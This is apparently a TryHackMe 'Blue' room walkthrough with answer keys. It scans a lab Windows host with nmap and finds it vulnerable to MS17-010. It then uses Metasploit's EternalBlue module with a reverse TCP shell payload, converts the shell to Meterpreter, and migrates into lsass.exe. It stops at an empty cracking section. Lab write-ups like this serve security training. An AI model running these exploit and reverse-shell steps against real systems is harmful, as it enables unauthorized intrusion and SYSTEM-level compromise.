# Blue TryHackme Walkthrough

Room URL: https://tryhackme.com/room/blue

# Recon

**Questions:**

**Q1. Scan the machine. (If you are unsure how to tackle this, I recommend checking out the Nmap room)**

Let's first do a simple scan to see open ports 

`sudo nmap -sS -vv 10.10.194.244 > scan.txt `

scan.txt result:

``` 
Starting Nmap 7.93 ( https://nmap.org ) at 2025-04-01 03:22 EDT
Initiating Ping Scan at 03:22
Scanning 10.10.194.244 [4 ports]
Completed Ping Scan at 03:22, 0.15s elapsed (1 total hosts)
Initiating Parallel DNS resolution of 1 host. at 03:22
Completed Parallel DNS resolution of 1 host. at 03:22, 0.23s elapsed
Initiating SYN Stealth Scan at 03:22
Scanning 10.10.194.244 [1000 ports]
Discovered open port 139/tcp on 10.10.194.244
Discovered open port 445/tcp on 10.10.194.244
Discovered open port 3389/tcp on 10.10.194.244
Discovered open port 135/tcp on 10.10.194.244
Discovered open port 49153/tcp on 10.10.194.244
Discovered open port 49152/tcp on 10.10.194.244
Discovered open port 49154/tcp on 10.10.194.244
Discovered open port 49160/tcp on 10.10.194.244
Discovered open port 49158/tcp on 10.10.194.244
Completed SYN Stealth Scan at 03:23, 12.95s elapsed (1000 total ports)
Nmap scan report for 10.10.194.244
Host is up, received echo-reply ttl 127 (0.22s latency).
Scanned at 2025-04-01 03:23:00 EDT for 12s
Not shown: 991 closed tcp ports (reset)
PORT      STATE SERVICE       REASON
135/tcp   open  msrpc         syn-ack ttl 127
139/tcp   open  netbios-ssn   syn-ack ttl 127
445/tcp   open  microsoft-ds  syn-ack ttl 127
3389/tcp  open  ms-wbt-server syn-ack ttl 127
49152/tcp open  unknown       syn-ack ttl 127
49153/tcp open  unknown       syn-ack ttl 127
49154/tcp open  unknown       syn-ack ttl 127
49158/tcp open  unknown       syn-ack ttl 127
49160/tcp open  unknown       syn-ack ttl 127

Read data files from: /usr/bin/../share/nmap
Nmap done: 1 IP address (1 host up) scanned in 13.40 seconds
           Raw packets sent: 1301 (57.220KB) | Rcvd: 1017 (40.704KB)

```

Now that let's do vuln scan on a specific open port

`sudo nmap -p 445,135,139 -sV -vv --script vuln 10.10.194.244 > vuln_scan.txt`

vuln_scan.txt result:

``` 
Starting Nmap 7.93 ( https://nmap.org ) at 2025-04-01 03:43 EDT
NSE: Loaded 149 scripts for scanning.
NSE: Script Pre-scanning.
NSE: Starting runlevel 1 (of 2) scan.
Initiating NSE at 03:43
Completed NSE at 03:43, 10.01s elapsed
NSE: Starting runlevel 2 (of 2) scan.
Initiating NSE at 03:43
Completed NSE at 03:43, 0.00s elapsed
Initiating Ping Scan at 03:43
Scanning 10.10.194.244 [4 ports]
Completed Ping Scan at 03:43, 0.16s elapsed (1 total hosts)
Initiating Parallel DNS resolution of 1 host. at 03:43
Completed Parallel DNS resolution of 1 host. at 03:43, 0.17s elapsed
Initiating SYN Stealth Scan at 03:43
Scanning 10.10.194.244 [3 ports]
Discovered open port 445/tcp on 10.10.194.244
Discovered open port 135/tcp on 10.10.194.244
Discovered open port 139/tcp on 10.10.194.244
Completed SYN Stealth Scan at 03:43, 0.17s elapsed (3 total ports)
Initiating Service scan at 03:43
Scanning 3 services on 10.10.194.244
Completed Service scan at 03:43, 6.53s elapsed (3 services on 1 host)
NSE: Script scanning 10.10.194.244.
NSE: Starting runlevel 1 (of 2) scan.
Initiating NSE at 03:43
Completed NSE at 03:44, 5.80s elapsed
NSE: Starting runlevel 2 (of 2) scan.
Initiating NSE at 03:44
Completed NSE at 03:44, 0.01s elapsed
Nmap scan report for 10.10.194.244
Host is up, received echo-reply ttl 127 (0.13s latency).
Scanned at 2025-04-01 03:43:47 EDT for 13s

PORT    STATE SERVICE      REASON          VERSION
135/tcp open  msrpc        syn-ack ttl 127 Microsoft Windows RPC
139/tcp open  netbios-ssn  syn-ack ttl 127 Microsoft Windows netbios-ssn
445/tcp open  microsoft-ds syn-ack ttl 127 Microsoft Windows 7 - 10 microsoft-ds (workgroup: WORKGROUP)
Service Info: Host: JON-PC; OS: Windows; CPE: cpe:/o:microsoft:windows

Host script results:
|_smb-vuln-ms10-054: false
|_smb-vuln-ms10-061: NT_STATUS_ACCESS_DENIED
|_samba-vuln-cve-2012-1182: NT_STATUS_ACCESS_DENIED
| smb-vuln-ms17-010: 
|   VULNERABLE:
|   Remote Code Execution vulnerability in Microsoft SMBv1 servers (ms17-010)
|     State: VULNERABLE
|     IDs:  CVE:CVE-2017-0143
|     Risk factor: HIGH
|       A critical remote code execution vulnerability exists in Microsoft SMBv1
|        servers (ms17-010).
|           
|     Disclosure date: 2017-03-14
|     References:
|       https://technet.microsoft.com/en-us/library/security/ms17-010.aspx
|       https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2017-0143
|_      https://blogs.technet.microsoft.com/msrc/2017/05/12/customer-guidance-for-wannacrypt-attacks/

NSE: Script Post-scanning.
NSE: Starting runlevel 1 (of 2) scan.
Initiating NSE at 03:44
Completed NSE at 03:44, 0.00s elapsed
NSE: Starting runlevel 2 (of 2) scan.
Initiating NSE at 03:44
Completed NSE at 03:44, 0.00s elapsed
Read data files from: /usr/bin/../share/nmap
Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 23.22 seconds
           Raw packets sent: 7 (284B) | Rcvd: 4 (160B)


```

Ans: ***No answer needed***

**Q2.How many ports are open with a port number under 1000?**

Ans: ***3***

**Q3.What is this machine vulnerable to? (Answer in the form of: ms??-???, ex: ms08-067)**

Ans: ***ms17-010***


# Gain Access

**Questions:**

**Q1.Start Metasploit**

`msfconsole`

Ans: ***No answer needed***

**Q2.Find the exploitation code we will run against the machine. What is the full path of the code? (Ex: exploit/........)**

`search ms17-010`

`use exploit/windows/smb/ms17_010_eternalblue`

`set rhosts <target ip>`

`set lhost <your machine ip>`

`set payload windows/x64/shell/reverse_tcp`

`run`

![show-options-eternalblue](https://github.com/user-attachments/assets/1a526898-d601-4b3b-8ea5-59b0ce1d4837)

Ans: ***exploit/windows/smb/ms17_010_eternalblue***

**Q3.Show options and set the one required value. What is the name of this value? (All caps for submission)**

Ans: ***RHOSTS***

**Q5.Confirm that the exploit has run correctly. You may have to press enter for the DOS shell to appear. Background this shell (CTRL + Z). If this failed, you may have to reboot the target VM. Try running it again before a reboot of the target.**

And with that, we have gained access!

![gaining_access](https://github.com/user-attachments/assets/12871f7d-0fe5-4973-8ae0-979c05dc1ee9)

# Escalate

**Questions:**

**Q1.If you haven't already, background the previously gained shell (CTRL + Z). Research online how to convert a shell to meterpreter shell in metasploit. What is the name of the post module we will use? (Exact path, similar to the exploit we previously selected)**

`search shell_to_meterpreter`

Ans: ***post/multi/manage/shell_to_meterpreter***

**Q2. Select this (use MODULE_PATH). Show options, what option are we required to change?**

![shell-to-meterpreter](https://github.com/user-attachments/assets/6c007520-9007-4c63-8dea-47516160398c)

Ans: ***SESSION***

**Q3. Set the required option, you may need to list all of the sessions to find your target here.**

`sessions` to list all the sessions

Ans: ***No answer needed***

**Q4.Run! If this doesn't work, try completing the exploit from the previous task once more.**

Now we have a Meterpreter shell! `use 2` to select meterprter shell

![show-sessions2](https://github.com/user-attachments/assets/32246468-6be0-41c0-847b-b5fde4969d5c)

Ans: ***No answer needed***

**Q5.Once the meterpreter shell conversion completes, select that session for use.**

Ans: ***No answer needed***

**Q6.Verify that we have escalated to NT AUTHORITY\SYSTEM. Run getsystem to confirm this. Feel free to open a dos shell via the command 'shell' and run 'whoami'. This should return that we are indeed system. Background this shell afterwards and select our meterpreter session for usage again.**

![getsystem](https://github.com/user-attachments/assets/6aa5bee9-b44b-4ffc-b129-8af0567f7622)

![whoami](https://github.com/user-attachments/assets/67b7f642-e005-4012-a35d-54cbeebaf060)

Ans: ***No answer needed***


**Q7.List all of the processes running via the 'ps' command. Just because we are system doesn't mean our process is. Find a process towards the bottom of this list that is running at NT AUTHORITY\SYSTEM and write down the process id (far left column).**

`ps` 

![ps](https://github.com/user-attachments/assets/1f2ad3c5-bb7e-41a7-b259-70609e5c7fba)

Ans: ***No answer needed***


**Q8.Migrate to this process using the 'migrate PROCESS_ID' command where the process id is the one you just wrote down in the previous step. This may take several attempts, migrating processes is not very stable. If this fails, you may need to re-run the conversion process or reboot the machine and start once again. If this happens, try a different process next time.**

`migrate 596 ` which is lsass.exe process

Ans: ***No answer needed***

# Cracking


